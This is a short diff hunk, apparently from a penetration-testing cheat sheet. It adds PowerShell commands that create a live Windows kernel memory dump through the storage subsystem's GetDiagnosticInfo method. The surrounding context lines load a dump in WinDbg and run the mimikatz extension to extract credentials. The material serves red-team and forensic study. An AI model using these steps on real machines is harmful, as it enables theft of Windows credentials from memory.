@@ -459,6 +459,12 @@ windgb + memory.dmp
 0:kd>!mimikatz
 
 net use z: /delete
+
+With Powershel !!!
+$ss = Get-CimInstance -ClassName MSFT_StorageSubSystem -Namespace Root\Microsoft\Windows\Storage;
+Invoke-CimMethod -InputObject $ss -MethodName "GetDiagnosticInfo" -Arguments @{DestinationPath="c:\users\adminlocal\desktop"; IncludeLiveDump=$true};
+
+
 ```
 https://github.com/Velocidex/WinPmem
 
